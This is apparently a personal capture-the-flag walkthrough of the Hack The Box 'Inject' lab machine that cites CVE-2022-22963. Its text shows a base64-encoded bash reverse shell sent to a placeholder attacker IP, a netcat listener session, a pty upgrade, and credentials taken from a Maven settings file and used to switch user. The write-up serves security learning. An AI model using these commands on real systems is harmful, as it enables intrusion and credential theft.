---
publish: false
tags:
  - Linux
  - Easy
---
---
# Reconnaissance 

![[Pasted image 20260109225402.png]]

 ---
# Foothold

![[Pasted image 20260109231608.png]]
![[Pasted image 20260109231623.png]]
![[Pasted image 20260109231650.png]]
If we intercept this request we're able to easily manipulate the parameters.
![[Pasted image 20260109231746.png]]
We're able to look into the file system
![[Pasted image 20260109232324.png]]
 CVE-2022-22963
![[Pasted image 20260109235052.png]]
```bash
󰣇 offsec/htb/inject ❯ echo "sh -i >& /dev/tcp/YOUR_IP/4444 0>&1" | base64    
c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTcvNDQ0NCAwPiYxCg==
```

![[Pasted image 20260110000454.png]]
we got rev shell on target

```
󰣇 offsec/htb/inject ❯ rlwrap nc -nvlp 4444                                                                                                                                                                                                                                                                                                               23:53 
Listening on 0.0.0.0 4444
Connection received on 10.10.11.204 41978
can't access tty; job control turned off
$ whoami
frank
$ which python3
/usr/bin/python3
$ python3 -c "import pty;pty.spawn('/bin/bash')"
frank@inject:/$ cd /home
cd /home
frank@inject:/home$ ls
ls
frank  phil
frank@inject:/home$ cd frank
cd frank
frank@inject:~$ ls
ls
frank@inject:~$ ls -la
ls -la
total 28
drwxr-xr-x 5 frank frank 4096 Feb  1  2023 .
drwxr-xr-x 4 root  root  4096 Feb  1  2023 ..
lrwxrwxrwx 1 root  root     9 Jan 24  2023 .bash_history -> /dev/null
-rw-r--r-- 1 frank frank 3786 Apr 18  2022 .bashrc
drwx------ 2 frank frank 4096 Feb  1  2023 .cache
drwxr-xr-x 3 frank frank 4096 Feb  1  2023 .local
drwx------ 2 frank frank 4096 Feb  1  2023 .m2
-rw-r--r-- 1 frank frank  807 Feb 25  2020 .profile
frank@inject:~$ cd .m2
cd .m2
frank@inject:~/.m2$ ls
ls
settings.xml
frank@inject:~/.m2$ cat settings.xml
cat settings.xml
<?xml version="1.0" encoding="UTF-8"?>
<settings xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
  <servers>
    <server>
      <id>Inject</id>
      <username>phil</username>
      <password><SNIP></password>
      <privateKey>${user.home}/.ssh/id_dsa</privateKey>
      <filePermissions>660</filePermissions>
      <directoryPermissions>660</directoryPermissions>
      <configuration></configuration>
    </server>
  </servers>
</settings>
frank@inject:~/.m2$ su phil
su phil
Password: <SNIP>


phil@inject:/home/frank/.m2$ cat /home/phil/user.txt
cat /home/phil/user.txt
7ff8f3ab<SNIP>09e596e931ab
phil@inject:/home/frank/.m2$ 
```